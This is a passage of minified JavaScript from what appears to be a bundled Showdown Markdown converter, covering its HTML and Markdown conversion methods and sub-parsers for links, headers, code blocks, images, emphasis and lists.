converter.listen() method: name must be a string, but "+typeof c+" given");if(typeof m!="function")throw Error("Invalid argument in converter.listen() method: callback must be a function, but "+typeof m+" given");o.hasOwnProperty(c)||(o[c]=[]),o[c].push(m)}function w(c){var m=c.match(/^\s*/)[0].length,v=new RegExp("^\\s{0,"+m+"}","gm");return c.replace(v,"")}this._dispatch=function(m,v,C,L){if(o.hasOwnProperty(m))for(var j=0;j<o[m].length;++j){var U=o[m][j](m,v,this,C,L);U&&typeof U<"u"&&(v=U)}return v},this.listen=function(c,m){return g(c,m),this},this.makeHtml=function(c){if(!c)return c;var m={gHtmlBlocks:[],gHtmlMdBlocks:[],gHtmlSpans:[],gUrls:{},gTitles:{},gDimensions:{},gListLevel:0,hashLinkCounts:{},langExtensions:d,outputModifiers:n,converter:this,ghCodeBlocks:[],metadata:{parsed:{},raw:"",format:""}};return c=c.replace(/¨/g,"¨T"),c=c.replace(/\$/g,"¨D"),c=c.replace(/\r\n/g,`
`),c=c.replace(/\r/g,`
`),c=c.replace(/\u00A0/g,"&nbsp;"),u.smartIndentationFix&&(c=w(c)),c=`

`+c+`

`,c=r.subParser("detab")(c,u,m),c=c.replace(/^[ \t]+$/mg,""),r.helper.forEach(d,function(v){c=r.subParser("runExtension")(v,c,u,m)}),c=r.subParser("metadata")(c,u,m),c=r.subParser("hashPreCodeTags")(c,u,m),c=r.subParser("githubCodeBlocks")(c,u,m),c=r.subParser("hashHTMLBlocks")(c,u,m),c=r.subParser("hashCodeTags")(c,u,m),c=r.subParser("stripLinkDefinitions")(c,u,m),c=r.subParser("blockGamut")(c,u,m),c=r.subParser("unhashHTMLSpans")(c,u,m),c=r.subParser("unescapeSpecialChars")(c,u,m),c=c.replace(/¨D/g,"$$"),c=c.replace(/¨T/g,"¨"),c=r.subParser("completeHTMLDocument")(c,u,m),r.helper.forEach(n,function(v){c=r.subParser("runExtension")(v,c,u,m)}),i=m.metadata,c},this.makeMarkdown=this.makeMd=function(c,m){if(c=c.replace(/\r\n/g,`
`),c=c.replace(/\r/g,`
`),c=c.replace(/>[ \t]+</,">¨NBSP;<"),!m)if(window&&window.document)m=window.document;else throw new Error("HTMLParser is undefined. If in a webworker or nodejs environment, you need to provide a WHATWG DOM and HTML such as JSDOM");var v=m.createElement("div");v.innerHTML=c;var C={preList:q(v)};O(v);for(var L=v.childNodes,j="",U=0;U<L.length;U++)j+=r.subParser("makeMarkdown.node")(L[U],C);function O(R){for(var F=0;F<R.childNodes.length;++F){var W=R.childNodes[F];W.nodeType===3?!/\S/.test(W.nodeValue)&&!/^[ ]+$/.test(W.nodeValue)?(R.removeChild(W),--F):(W.nodeValue=W.nodeValue.split(`
`).join(" "),W.nodeValue=W.nodeValue.replace(/(\s)+/g,"$1")):W.nodeType===1&&O(W)}}function q(R){for(var F=R.querySelectorAll("pre"),W=[],G=0;G<F.length;++G)if(F[G].childElementCount===1&&F[G].firstChild.tagName.toLowerCase()==="code"){var oe=F[G].firstChild.innerHTML.trim(),se=F[G].firstChild.getAttribute("data-language")||"";if(se==="")for(var ye=F[G].firstChild.className.split(" "),fe=0;fe<ye.length;++fe){var ve=ye[fe].match(/^language-(.+)$/);if(ve!==null){se=ve[1];break}}oe=r.helper.unescapeHTMLEntities(oe),W.push(oe),F[G].outerHTML='<precode language="'+se+'" precodenum="'+G.toString()+'"></precode>'}else W.push(F[G].innerHTML),F[G].innerHTML="",F[G].setAttribute("prenum",G.toString());return W}return j},this.setOption=function(c,m){u[c]=m},this.getOption=function(c){return u[c]},this.getOptions=function(){return u},this.addExtension=function(c,m){m=m||null,y(c,m)},this.useExtension=function(c){y(c)},this.setFlavor=function(c){if(!S.hasOwnProperty(c))throw Error(c+" flavor was not found");var m=S[c];f=c;for(var v in m)m.hasOwnProperty(v)&&(u[v]=m[v])},this.getFlavor=function(){return f},this.removeExtension=function(c){r.helper.isArray(c)||(c=[c]);for(var m=0;m<c.length;++m){for(var v=c[m],C=0;C<d.length;++C)d[C]===v&&d.splice(C,1);for(var L=0;L<n.length;++L)n[L]===v&&n.splice(L,1)}},this.getAllExtensions=function(){return{language:d,output:n}},this.getMetadata=function(c){return c?i.raw:i.parsed},this.getMetadataFormat=function(){return i.format},this._setMetadataPair=function(c,m){i.parsed[c]=m},this._setMetadataFormat=function(c){i.format=c},this._setMetadataRaw=function(c){i.raw=c}},r.subParser("anchors",function(e,u,d){e=d.converter._dispatch("anchors.before",e,u,d);var n=function(o,f,i,l,y,b,g){if(r.helper.isUndefined(g)&&(g=""),i=i.toLowerCase(),o.search(/\(<?\s*>? ?(['"].*['"])?\)$/m)>-1)l="";else if(!l)if(i||(i=f.toLowerCase().replace(/ ?\n/g," ")),l="#"+i,!r.helper.isUndefined(d.gUrls[i]))l=d.gUrls[i],r.helper.isUndefined(d.gTitles[i])||(g=d.gTitles[i]);else return o;l=l.replace(r.helper.regexes.asteriskDashAndColon,r.helper.escapeCharactersCallback);var w='<a href="'+l+'"';return g!==""&&g!==null&&(g=g.replace(/"/g,"&quot;"),g=g.replace(r.helper.regexes.asteriskDashAndColon,r.helper.escapeCharactersCallback),w+=' title="'+g+'"'),u.openLinksInNewWindow&&!/^#/.test(l)&&(w+=' rel="noopener noreferrer" target="¨E95Eblank"'),w+=">"+f+"</a>",w};return e=e.replace(/\[((?:\[[^\]]*]|[^\[\]])*)] ?(?:\n *)?\[(.*?)]()()()()/g,n),e=e.replace(/\[((?:\[[^\]]*]|[^\[\]])*)]()[ \t]*\([ \t]?<([^>]*)>(?:[ \t]*((["'])([^"]*?)\5))?[ \t]?\)/g,n),e=e.replace(/\[((?:\[[^\]]*]|[^\[\]])*)]()[ \t]*\([ \t]?<?([\S]+?(?:\([\S]*?\)[\S]*?)?)>?(?:[ \t]*((["'])([^"]*?)\5))?[ \t]?\)/g,n),e=e.replace(/\[([^\[\]]+)]()()()()()/g,n),u.ghMentions&&(e=e.replace(/(^|\s)(\\)?(@([a-z\d]+(?:[a-z\d.-]+?[a-z\d]+)*))/gmi,function(o,f,i,l,y){if(i==="\\")return f+l;if(!r.helper.isString(u.ghMentionsLink))throw new Error("ghMentionsLink option must be a string");var b=u.ghMentionsLink.replace(/\{u}/g,y),g="";return u.openLinksInNewWindow&&(g=' rel="noopener noreferrer" target="¨E95Eblank"'),f+'<a href="'+b+'"'+g+">"+l+"</a>"})),e=d.converter._dispatch("anchors.after",e,u,d),e});var N=/([*~_]+|\b)(((https?|ftp|dict):\/\/|www\.)[^'">\s]+?\.[^'">\s]+?)()(\1)?(?=\s|$)(?!["<>])/gi,A=/([*~_]+|\b)(((https?|ftp|dict):\/\/|www\.)[^'">\s]+\.[^'">\s]+?)([.!?,()\[\]])?(\1)?(?=\s|$)(?!["<>])/gi,E=/()<(((https?|ftp|dict):\/\/|www\.)[^'">\s]+)()>()/gi,M=/(^|\s)(?:mailto:)?([A-Za-z0-9!#$%&'*+-/=?^_`{|}~.]+@[-a-z0-9]+(\.[-a-z0-9]+)*\.[a-z]+)(?=$|\s)/gmi,K=/<()(?:mailto:)?([-.\w]+@[-a-z0-9]+(\.[-a-z0-9]+)*\.[a-z]+)>/gi,$=function(e){return function(u,d,n,o,f,i,l){n=n.replace(r.helper.regexes.asteriskDashAndColon,r.helper.escapeCharactersCallback);var y=n,b="",g="",w=d||"",c=l||"";return/^www\./i.test(n)&&(n=n.replace(/^www\./i,"http://www.")),e.excludeTrailingPunctuationFromURLs&&i&&(b=i),e.openLinksInNewWindow&&(g=' rel="noopener noreferrer" target="¨E95Eblank"'),w+'<a href="'+n+'"'+g+">"+y+"</a>"+b+c}},D=function(e,u){return function(d,n,o){var f="mailto:";return n=n||"",o=r.subParser("unescapeSpecialChars")(o,e,u),e.encodeEmails?(f=r.helper.encodeEmailAddress(f+o),o=r.helper.encodeEmailAddress(o)):f=f+o,n+'<a href="'+f+'">'+o+"</a>"}};r.subParser("autoLinks",function(e,u,d){return e=d.converter._dispatch("autoLinks.before",e,u,d),e=e.replace(E,$(u)),e=e.replace(K,D(u,d)),e=d.converter._dispatch("autoLinks.after",e,u,d),e}),r.subParser("simplifiedAutoLinks",function(e,u,d){return u.simplifiedAutoLink&&(e=d.converter._dispatch("simplifiedAutoLinks.before",e,u,d),u.excludeTrailingPunctuationFromURLs?e=e.replace(A,$(u)):e=e.replace(N,$(u)),e=e.replace(M,D(u,d)),e=d.converter._dispatch("simplifiedAutoLinks.after",e,u,d)),e}),r.subParser("blockGamut",function(e,u,d){return e=d.converter._dispatch("blockGamut.before",e,u,d),e=r.subParser("blockQuotes")(e,u,d),e=r.subParser("headers")(e,u,d),e=r.subParser("horizontalRule")(e,u,d),e=r.subParser("lists")(e,u,d),e=r.subParser("codeBlocks")(e,u,d),e=r.subParser("tables")(e,u,d),e=r.subParser("hashHTMLBlocks")(e,u,d),e=r.subParser("paragraphs")(e,u,d),e=d.converter._dispatch("blockGamut.after",e,u,d),e}),r.subParser("blockQuotes",function(e,u,d){e=d.converter._dispatch("blockQuotes.before",e,u,d),e=e+`

`;var n=/(^ {0,3}>[ \t]?.+\n(.+\n)*\n*)+/gm;return u.splitAdjacentBlockquotes&&(n=/^ {0,3}>[\s\S]*?(?:\n\n)/gm),e=e.replace(n,function(o){return o=o.replace(/^[ \t]*>[ \t]?/gm,""),o=o.replace(/¨0/g,""),o=o.replace(/^[ \t]+$/gm,""),o=r.subParser("githubCodeBlocks")(o,u,d),o=r.subParser("blockGamut")(o,u,d),o=o.replace(/(^|\n)/g,"$1  "),o=o.replace(/(\s*<pre>[^\r]+?<\/pre>)/gm,function(f,i){var l=i;return l=l.replace(/^  /mg,"¨0"),l=l.replace(/¨0/g,""),l}),r.subParser("hashBlock")(`<blockquote>
`+o+`
</blockquote>`,u,d)}),e=d.converter._dispatch("blockQuotes.after",e,u,d),e}),r.subParser("codeBlocks",function(e,u,d){e=d.converter._dispatch("codeBlocks.before",e,u,d),e+="¨0";var n=/(?:\n\n|^)((?:(?:[ ]{4}|\t).*\n+)+)(\n*[ ]{0,3}[^ \t\n]|(?=¨0))/g;return e=e.replace(n,function(o,f,i){var l=f,y=i,b=`
`;return l=r.subParser("outdent")(l,u,d),l=r.subParser("encodeCode")(l,u,d),l=r.subParser("detab")(l,u,d),l=l.replace(/^\n+/g,""),l=l.replace(/\n+$/g,""),u.omitExtraWLInCodeBlocks&&(b=""),l="<pre><code>"+l+b+"</code></pre>",r.subParser("hashBlock")(l,u,d)+y}),e=e.replace(/¨0/,""),e=d.converter._dispatch("codeBlocks.after",e,u,d),e}),r.subParser("codeSpans",function(e,u,d){return e=d.converter._dispatch("codeSpans.before",e,u,d),typeof e>"u"&&(e=""),e=e.replace(/(^|[^\\])(`+)([^\r]*?[^`])\2(?!`)/gm,function(n,o,f,i){var l=i;return l=l.replace(/^([ \t]*)/g,""),l=l.replace(/[ \t]*$/g,""),l=r.subParser("encodeCode")(l,u,d),l=o+"<code>"+l+"</code>",l=r.subParser("hashHTMLSpans")(l,u,d),l}),e=d.converter._dispatch("codeSpans.after",e,u,d),e}),r.subParser("completeHTMLDocument",function(e,u,d){if(!u.completeHTMLDocument)return e;e=d.converter._dispatch("completeHTMLDocument.before",e,u,d);var n="html",o=`<!DOCTYPE HTML>
`,f="",i=`<meta charset="utf-8">
`,l="",y="";typeof d.metadata.parsed.doctype<"u"&&(o="<!DOCTYPE "+d.metadata.parsed.doctype+`>
`,n=d.metadata.parsed.doctype.toString().toLowerCase(),(n==="html"||n==="html5")&&(i='<meta charset="utf-8">'));for(var b in d.metadata.parsed)if(d.metadata.parsed.hasOwnProperty(b))switch(b.toLowerCase()){case"doctype":break;case"title":f="<title>"+d.metadata.parsed.title+`</title>
`;break;case"charset":n==="html"||n==="html5"?i='<meta charset="'+d.metadata.parsed.charset+`">
`:i='<meta name="charset" content="'+d.metadata.parsed.charset+`">
`;break;case"language":case"lang":l=' lang="'+d.metadata.parsed[b]+'"',y+='<meta name="'+b+'" content="'+d.metadata.parsed[b]+`">
`;break;default:y+='<meta name="'+b+'" content="'+d.metadata.parsed[b]+`">
`}return e=o+"<html"+l+`>
<head>
`+f+i+y+`</head>
<body>
`+e.trim()+`
</body>
</html>`,e=d.converter._dispatch("completeHTMLDocument.after",e,u,d),e}),r.subParser("detab",function(e,u,d){return e=d.converter._dispatch("detab.before",e,u,d),e=e.replace(/\t(?=\t)/g,"    "),e=e.replace(/\t/g,"¨A¨B"),e=e.replace(/¨B(.+?)¨A/g,function(n,o){for(var f=o,i=4-f.length%4,l=0;l<i;l++)f+=" ";return f}),e=e.replace(/¨A/g,"    "),e=e.replace(/¨B/g,""),e=d.converter._dispatch("detab.after",e,u,d),e}),r.subParser("ellipsis",function(e,u,d){return u.ellipsis&&(e=d.converter._dispatch("ellipsis.before",e,u,d),e=e.replace(/\.\.\./g,"…"),e=d.converter._dispatch("ellipsis.after",e,u,d)),e}),r.subParser("emoji",function(e,u,d){if(!u.emoji)return e;e=d.converter._dispatch("emoji.before",e,u,d);var n=/:([\S]+?):/g;return e=e.replace(n,function(o,f){return r.helper.emojis.hasOwnProperty(f)?r.helper.emojis[f]:o}),e=d.converter._dispatch("emoji.after",e,u,d),e}),r.subParser("encodeAmpsAndAngles",function(e,u,d){return e=d.converter._dispatch("encodeAmpsAndAngles.before",e,u,d),e=e.replace(/&(?!#?[xX]?(?:[0-9a-fA-F]+|\w+);)/g,"&amp;"),e=e.replace(/<(?![a-z\/?$!])/gi,"&lt;"),e=e.replace(/</g,"&lt;"),e=e.replace(/>/g,"&gt;"),e=d.converter._dispatch("encodeAmpsAndAngles.after",e,u,d),e}),r.subParser("encodeBackslashEscapes",function(e,u,d){return e=d.converter._dispatch("encodeBackslashEscapes.before",e,u,d),e=e.replace(/\\(\\)/g,r.helper.escapeCharactersCallback),e=e.replace(/\\([`*_{}\[\]()>#+.!~=|:-])/g,r.helper.escapeCharactersCallback),e=d.converter._dispatch("encodeBackslashEscapes.after",e,u,d),e}),r.subParser("encodeCode",function(e,u,d){return e=d.converter._dispatch("encodeCode.before",e,u,d),e=e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/([*_{}\[\]\\=~-])/g,r.helper.escapeCharactersCallback),e=d.converter._dispatch("encodeCode.after",e,u,d),e}),r.subParser("escapeSpecialCharsWithinTagAttributes",function(e,u,d){e=d.converter._dispatch("escapeSpecialCharsWithinTagAttributes.before",e,u,d);var n=/<\/?[a-z\d_:-]+(?:[\s]+[\s\S]+?)?>/gi,o=/<!(--(?:(?:[^>-]|-[^>])(?:[^-]|-[^-])*)--)>/gi;return e=e.replace(n,function(f){return f.replace(/(.)<\/?code>(?=.)/g,"$1`").replace(/([\\`*_~=|])/g,r.helper.escapeCharactersCallback)}),e=e.replace(o,function(f){return f.replace(/([\\`*_~=|])/g,r.helper.escapeCharactersCallback)}),e=d.converter._dispatch("escapeSpecialCharsWithinTagAttributes.after",e,u,d),e}),r.subParser("githubCodeBlocks",function(e,u,d){return u.ghCodeBlocks?(e=d.converter._dispatch("githubCodeBlocks.before",e,u,d),e+="¨0",e=e.replace(/(?:^|\n)(?: {0,3})(```+|~~~+)(?: *)([^\s`~]*)\n([\s\S]*?)\n(?: {0,3})\1/g,function(n,o,f,i){var l=u.omitExtraWLInCodeBlocks?"":`
`;return i=r.subParser("encodeCode")(i,u,d),i=r.subParser("detab")(i,u,d),i=i.replace(/^\n+/g,""),i=i.replace(/\n+$/g,""),i="<pre><code"+(f?' class="'+f+" language-"+f+'"':"")+">"+i+l+"</code></pre>",i=r.subParser("hashBlock")(i,u,d),`

¨G`+(d.ghCodeBlocks.push({text:n,codeblock:i})-1)+`G

`}),e=e.replace(/¨0/,""),d.converter._dispatch("githubCodeBlocks.after",e,u,d)):e}),r.subParser("hashBlock",function(e,u,d){return e=d.converter._dispatch("hashBlock.before",e,u,d),e=e.replace(/(^\n+|\n+$)/g,""),e=`

¨K`+(d.gHtmlBlocks.push(e)-1)+`K

`,e=d.converter._dispatch("hashBlock.after",e,u,d),e}),r.subParser("hashCodeTags",function(e,u,d){e=d.converter._dispatch("hashCodeTags.before",e,u,d);var n=function(o,f,i,l){var y=i+r.subParser("encodeCode")(f,u,d)+l;return"¨C"+(d.gHtmlSpans.push(y)-1)+"C"};return e=r.helper.replaceRecursiveRegExp(e,n,"<code\\b[^>]*>","</code>","gim"),e=d.converter._dispatch("hashCodeTags.after",e,u,d),e}),r.subParser("hashElement",function(e,u,d){return function(n,o){var f=o;return f=f.replace(/\n\n/g,`
`),f=f.replace(/^\n/,""),f=f.replace(/\n+$/g,""),f=`

¨K`+(d.gHtmlBlocks.push(f)-1)+`K

`,f}}),r.subParser("hashHTMLBlocks",function(e,u,d){e=d.converter._dispatch("hashHTMLBlocks.before",e,u,d);var n=["pre","div","h1","h2","h3","h4","h5","h6","blockquote","table","dl","ol","ul","script","noscript","form","fieldset","iframe","math","style","section","header","footer","nav","article","aside","address","audio","canvas","figure","hgroup","output","video","p"],o=function(c,m,v,C){var L=c;return v.search(/\bmarkdown\b/)!==-1&&(L=v+d.converter.makeHtml(m)+C),`

¨K`+(d.gHtmlBlocks.push(L)-1)+`K

`};u.backslashEscapesHTMLTags&&(e=e.replace(/\\<(\/?[^>]+?)>/g,function(c,m){return"&lt;"+m+"&gt;"}));for(var f=0;f<n.length;++f)for(var i,l=new RegExp("^ {0,3}(<"+n[f]+"\\b[^>]*>)","im"),y="<"+n[f]+"\\b[^>]*>",b="</"+n[f]+">";(i=r.helper.regexIndexOf(e,l))!==-1;){var g=r.helper.splitAtIndex(e,i),w=r.helper.replaceRecursiveRegExp(g[1],o,y,b,"im");if(w===g[1])break;e=g[0].concat(w)}return e=e.replace(/(\n {0,3}(<(hr)\b([^<>])*?\/?>)[ \t]*(?=\n{2,}))/g,r.subParser("hashElement")(e,u,d)),e=r.helper.replaceRecursiveRegExp(e,function(c){return`

¨K`+(d.gHtmlBlocks.push(c)-1)+`K

`},"^ {0,3}<!--","-->","gm"),e=e.replace(/(?:\n\n)( {0,3}(?:<([?%])[^\r]*?\2>)[ \t]*(?=\n{2,}))/g,r.subParser("hashElement")(e,u,d)),e=d.converter._dispatch("hashHTMLBlocks.after",e,u,d),e}),r.subParser("hashHTMLSpans",function(e,u,d){e=d.converter._dispatch("hashHTMLSpans.before",e,u,d);function n(o){return"¨C"+(d.gHtmlSpans.push(o)-1)+"C"}return e=e.replace(/<[^>]+?\/>/gi,function(o){return n(o)}),e=e.replace(/<([^>]+?)>[\s\S]*?<\/\1>/g,function(o){return n(o)}),e=e.replace(/<([^>]+?)\s[^>]+?>[\s\S]*?<\/\1>/g,function(o){return n(o)}),e=e.replace(/<[^>]+?>/gi,function(o){return n(o)}),e=d.converter._dispatch("hashHTMLSpans.after",e,u,d),e}),r.subParser("unhashHTMLSpans",function(e,u,d){e=d.converter._dispatch("unhashHTMLSpans.before",e,u,d);for(var n=0;n<d.gHtmlSpans.length;++n){for(var o=d.gHtmlSpans[n],f=0;/¨C(\d+)C/.test(o);){var i=RegExp.$1;if(o=o.replace("¨C"+i+"C",d.gHtmlSpans[i]),f===10){console.error("maximum nesting of 10 spans reached!!!");break}++f}e=e.replace("¨C"+n+"C",o)}return e=d.converter._dispatch("unhashHTMLSpans.after",e,u,d),e}),r.subParser("hashPreCodeTags",function(e,u,d){e=d.converter._dispatch("hashPreCodeTags.before",e,u,d);var n=function(o,f,i,l){var y=i+r.subParser("encodeCode")(f,u,d)+l;return`

¨G`+(d.ghCodeBlocks.push({text:o,codeblock:y})-1)+`G

`};return e=r.helper.replaceRecursiveRegExp(e,n,"^ {0,3}<pre\\b[^>]*>\\s*<code\\b[^>]*>","^ {0,3}</code>\\s*</pre>","gim"),e=d.converter._dispatch("hashPreCodeTags.after",e,u,d),e}),r.subParser("headers",function(e,u,d){e=d.converter._dispatch("headers.before",e,u,d);var n=isNaN(parseInt(u.headerLevelStart))?1:parseInt(u.headerLevelStart),o=u.smoothLivePreview?/^(.+)[ \t]*\n={2,}[ \t]*\n+/gm:/^(.+)[ \t]*\n=+[ \t]*\n+/gm,f=u.smoothLivePreview?/^(.+)[ \t]*\n-{2,}[ \t]*\n+/gm:/^(.+)[ \t]*\n-+[ \t]*\n+/gm;e=e.replace(o,function(y,b){var g=r.subParser("spanGamut")(b,u,d),w=u.noHeaderId?"":' id="'+l(b)+'"',c=n,m="<h"+c+w+">"+g+"</h"+c+">";return r.subParser("hashBlock")(m,u,d)}),e=e.replace(f,function(y,b){var g=r.subParser("spanGamut")(b,u,d),w=u.noHeaderId?"":' id="'+l(b)+'"',c=n+1,m="<h"+c+w+">"+g+"</h"+c+">";return r.subParser("hashBlock")(m,u,d)});var i=u.requireSpaceBeforeHeadingText?/^(#{1,6})[ \t]+(.+?)[ \t]*#*\n+/gm:/^(#{1,6})[ \t]*(.+?)[ \t]*#*\n+/gm;e=e.replace(i,function(y,b,g){var w=g;u.customizedHeaderId&&(w=g.replace(/\s?\{([^{]+?)}\s*$/,""));var c=r.subParser("spanGamut")(w,u,d),m=u.noHeaderId?"":' id="'+l(g)+'"',v=n-1+b.length,C="<h"+v+m+">"+c+"</h"+v+">";return r.subParser("hashBlock")(C,u,d)});function l(y){var b,g;if(u.customizedHeaderId){var w=y.match(/\{([^{]+?)}\s*$/);w&&w[1]&&(y=w[1])}return b=y,r.helper.isString(u.prefixHeaderId)?g=u.prefixHeaderId:u.prefixHeaderId===!0?g="section-":g="",u.rawPrefixHeaderId||(b=g+b),u.ghCompatibleHeaderId?b=b.replace(/ /g,"-").replace(/&amp;/g,"").replace(/¨T/g,"").replace(/¨D/g,"").replace(/[&+$,\/:;=?@"#{}|^¨~\[\]`\\*)(%.!'<>]/g,"").toLowerCase():u.rawHeaderId?b=b.replace(/ /g,"-").replace(/&amp;/g,"&").replace(/¨T/g,"¨").replace(/¨D/g,"$").replace(/["']/g,"-").toLowerCase():b=b.replace(/[^\w]/g,"").toLowerCase(),u.rawPrefixHeaderId&&(b=g+b),d.hashLinkCounts[b]?b=b+"-"+d.hashLinkCounts[b]++:d.hashLinkCounts[b]=1,b}return e=d.converter._dispatch("headers.after",e,u,d),e}),r.subParser("horizontalRule",function(e,u,d){e=d.converter._dispatch("horizontalRule.before",e,u,d);var n=r.subParser("hashBlock")("<hr />",u,d);return e=e.replace(/^ {0,2}( ?-){3,}[ \t]*$/gm,n),e=e.replace(/^ {0,2}( ?\*){3,}[ \t]*$/gm,n),e=e.replace(/^ {0,2}( ?_){3,}[ \t]*$/gm,n),e=d.converter._dispatch("horizontalRule.after",e,u,d),e}),r.subParser("images",function(e,u,d){e=d.converter._dispatch("images.before",e,u,d);var n=/!\[([^\]]*?)][ \t]*()\([ \t]?<?([\S]+?(?:\([\S]*?\)[\S]*?)?)>?(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*(?:(["'])([^"]*?)\6)?[ \t]?\)/g,o=/!\[([^\]]*?)][ \t]*()\([ \t]?<([^>]*)>(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*(?:(?:(["'])([^"]*?)\6))?[ \t]?\)/g,f=/!\[([^\]]*?)][ \t]*()\([ \t]?<?(data:.+?\/.+?;base64,[A-Za-z0-9+/=\n]+?)>?(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*(?:(["'])([^"]*?)\6)?[ \t]?\)/g,i=/!\[([^\]]*?)] ?(?:\n *)?\[([\s\S]*?)]()()()()()/g,l=/!\[([^\[\]]+)]()()()()()/g;function y(g,w,c,m,v,C,L,j){return m=m.replace(/\s/g,""),b(g,w,c,m,v,C,L,j)}function b(g,w,c,m,v,C,L,j){var U=d.gUrls,O=d.gTitles,q=d.gDimensions;if(c=c.toLowerCase(),j||(j=""),g.search(/\(<?\s*>? ?(['"].*['"])?\)$/m)>-1)m="";else if(m===""||m===null)if((c===""||c===null)&&(c=w.toLowerCase().replace(/ ?\n/g," ")),m="#"+c,!r.helper.isUndefined(U[c]))m=U[c],r.helper.isUndefined(O[c])||(j=O[c]),r.helper.isUndefined(q[c])||(v=q[c].width,C=q[c].height);else return g;w=w.replace(/"/g,"&quot;").replace(r.helper.regexes.asteriskDashAndColon,r.helper.escapeCharactersCallback),m=m.replace(r.helper.regexes.asteriskDashAndColon,r.helper.escapeCharactersCallback);var R='<img src="'+m+'" alt="'+w+'"';return j&&r.helper.isString(j)&&(j=j.replace(/"/g,"&quot;").replace(r.helper.regexes.asteriskDashAndColon,r.helper.escapeCharactersCallback),R+=' title="'+j+'"'),v&&C&&(v=v==="*"?"auto":v,C=C==="*"?"auto":C,R+=' width="'+v+'"',R+=' height="'+C+'"'),R+=" />",R}return e=e.replace(i,b),e=e.replace(f,y),e=e.replace(o,b),e=e.replace(n,b),e=e.replace(l,b),e=d.converter._dispatch("images.after",e,u,d),e}),r.subParser("italicsAndBold",function(e,u,d){e=d.converter._dispatch("italicsAndBold.before",e,u,d);function n(o,f,i){return f+o+i}return u.literalMidWordUnderscores?(e=e.replace(/\b___(\S[\s\S]*?)___\b/g,function(o,f){return n(f,"<strong><em>","</em></strong>")}),e=e.replace(/\b__(\S[\s\S]*?)__\b/g,function(o,f){return n(f,"<strong>","</strong>")}),e=e.replace(/\b_(\S[\s\S]*?)_\b/g,function(o,f){return n(f,"<em>","</em>")})):(e=e.replace(/___(\S[\s\S]*?)___/g,function(o,f){return/\S$/.test(f)?n(f,"<strong><em>","</em></strong>"):o}),e=e.replace(/__(\S[\s\S]*?)__/g,function(o,f){return/\S$/.test(f)?n(f,"<strong>","</strong>"):o}),e=e.replace(/_([^\s_][\s\S]*?)_/g,function(o,f){return/\S$/.test(f)?n(f,"<em>","</em>"):o})),u.literalMidWordAsterisks?(e=e.replace(/([^*]|^)\B\*\*\*(\S[\s\S]*?)\*\*\*\B(?!\*)/g,function(o,f,i){return n(i,f+"<strong><em>","</em></strong>")}),e=e.replace(/([^*]|^)\B\*\*(\S[\s\S]*?)\*\*\B(?!\*)/g,function(o,f,i){return n(i,f+"<strong>","</strong>")}),e=e.replace(/([^*]|^)\B\*(\S[\s\S]*?)\*\B(?!\*)/g,function(o,f,i){return n(i,f+"<em>","</em>")})):(e=e.replace(/\*\*\*(\S[\s\S]*?)\*\*\*/g,function(o,f){return/\S$/.test(f)?n(f,"<strong><em>","</em></strong>"):o}),e=e.replace(/\*\*(\S[\s\S]*?)\*\*/g,function(o,f){return/\S$/.test(f)?n(f,"<strong>","</strong>"):o}),e=e.replace(/\*([^\s*][\s\S]*?)\*/g,function(o,f){return/\S$/.test(f)?n(f,"<em>","</em>"):o})),e=d.converter._dispatch("italicsAndBold.after",e,u,d),e}),r.subParser("lists",function(e,u,d){function n(i,l){d.gListLevel++,i=i.replace(/\n{2,}$/,`
`),i+="¨0";var y=/(\n)?(^ {0,3})([*+-]|\d+[.])[ \t]+((\[(x|X| )?])?[ \t]*[^\r]+?(\n{1,2}))(?=\n*(¨0| {0,3}([*+-]|\d+[.])[ \t]+))/gm,b=/\n[ \t]*\n(?!¨0)/.test(i);return u.disableForced4SpacesIndentedSublists&&(y=/(\n)?(^ {0,3})([*+-]|\d+[.])[ \t]+((\[(x|X| )?])?[ \t]*[^\r]+?(\n{1,2}))(?=\n*(¨0|\2([*+-]|\d+[.])[ \t]+))/gm),i=i.replace(y,function(g,w,c,m,v,C,L){L=L&&L.trim()!=="";var j=r.subParser("outdent")(v,u,d),U="";return C&&u.tasklists&&(U=' class="task-list-item" style="list-style-type: none;"',j=j.replace(/^[ \t]*\[(x|X| )?]/m,function(){var O='<input type="checkbox" disabled style="margin: 0px 0.35em 0.25em -1.6em; vertical-align: middle;"';return L&&(O+=" checked"),O+=">",O})),j=j.replace(/^([-*+]|\d\.)[ \t]+[\S\n ]*/g,function(O){return"¨A"+O}),w||j.search(/\n{2,}/)>-1?(j=r.subParser("githubCodeBlocks")(j,u,d),j=r.subParser("blockGamut")(j,u,d)):(j=r.subParser("lists")(j,u,d),j=j.replace(/\n$/,""),j=r.subParser("hashHTMLBlocks")(j,u,d),j=j.replace(/\n\n+/g,`

`),b?j=r.subParser("paragraphs")(j,u,d):j=r.subParser("spanGamut")(j,u,d)),j=j.replace("¨A",""),j="<li"+U+">"+j+`</li>
`,j}),i=i.replace(/¨0/g,""),d.gListLevel--,l&&(i=i.replace(/\s+$/,"")),i}function o(i,l){if(l==="ol"){var y=i.match(/^ *(\d+)\./);if(y&&y[1]!=="1")return' start="'+y[1]+'"'}return""}function f(i,l,y){var b=u.disableForced4SpacesIndentedSublists?/^ ?\d+\.[ \t]/gm:/^ {0,3}\d+\.[ \t]/gm,g=u.disableForced4SpacesIndentedSublists?/^ ?[*+-][ \t]/gm:/^ {0,3}[*+-][ \t]/gm,w=l==="ul"?b:g,c="";if(i.search(w)!==-1)(function v(C){var L=C.search(w),j=o(i,l);L!==-1?(c+=`

<`+l+j+`>
`+n(C.slice(0,L),!!y)+"</"+l+`>
`,l=l==="ul"?"ol":"ul",w=l==="ul"?b:g,v(C.slice(L))):c+=`

<`+l+j+`>
`+n(C,!!y)+"</"+l+`>
`})(i);else{var m=o(i,l);c=`

<`+l+m+`>
`+n(i,!!y)+"</"+l+`>
